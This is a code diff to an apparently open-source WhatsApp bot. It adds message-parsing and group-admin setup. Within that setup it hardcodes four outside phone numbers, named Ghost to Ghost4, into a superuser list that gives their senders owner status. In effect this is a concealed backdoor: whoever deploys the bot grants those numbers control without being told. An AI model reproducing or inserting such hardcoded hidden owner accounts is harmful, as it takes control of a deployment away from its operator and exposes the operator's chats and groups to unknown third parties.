@@ -280,8 +280,60 @@ async function startKeith() {
             const body = m.mtype === "conversation" ? m.message.conversation :
                 m.mtype === "imageMessage" ? m.message.imageMessage.caption :
                 m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : "";
+            const pushname = m.pushName || "No Name";
+      const botNumber = await client.decodeJid(client.user.id);
+      const servBot = botNumber.split('@')[0];
+      const Ghost = "254796299158"; 
+      const Ghost2 = "254110190196";
+      const Ghost3 = "2547483876159";
+      const Ghost4 = "254743995989";
+      const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+      const isOwner = superUserNumbers.includes(m.sender); 
+      const isBotMessage = m.sender === botNumber;  
+      const itsMe = m.sender === botNumber;
+      const text = args.join(" ");
+      const Tag = m.mtype === "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null
+        ? m.message.extendedTextMessage.contextInfo.mentionedJid
+        : [];
+
+      let msgKeith = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
+      let budy = typeof m.text === "string" ? m.text : "";
+
+      const timestamp = speed();
+      const Keithspeed = speed() - timestamp;
+
+      const getGroupAdmins = (participants) => {
+        let admins = [];
+        for (let i of participants) {
+          if (i.admin === "superadmin") admins.push(i.id);
+          if (i.admin === "admin") admins.push(i.id);
+        }
+        return admins || [];
+      };
+
+      const keizzah = m.quoted || m;
+      const quoted = keizzah.mtype === 'buttonsMessage' ? keizzah[Object.keys(keizzah)[1]] :
+        keizzah.mtype === 'templateMessage' ? keizzah.hydratedTemplate[Object.keys(keizzah.hydratedTemplate)[1]] :
+          keizzah.mtype === 'product' ? keizzah[Object.keys(keizzah)[0]] : m.quoted ? m.quoted : m;
+
+      const color = (text, color) => {
+        return color ? chalk.keyword(color)(text) : chalk.green(text);
+      };
+
+      const mime = quoted.mimetype || "";
+      const qmsg = quoted;
+      const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(() => {}) : "";
+      const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : "";
+      const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
+      const groupAdmin = m.isGroup ? getGroupAdmins(participants) : [];
+      const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : false;
+      const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false;
+
+      const IsGroup = m.chat?.endsWith("@g.us");
+
 
             const { prefix } = require("./settings");
+            
             const cmd = body.startsWith(prefix);
             if (!cmd) return;
 
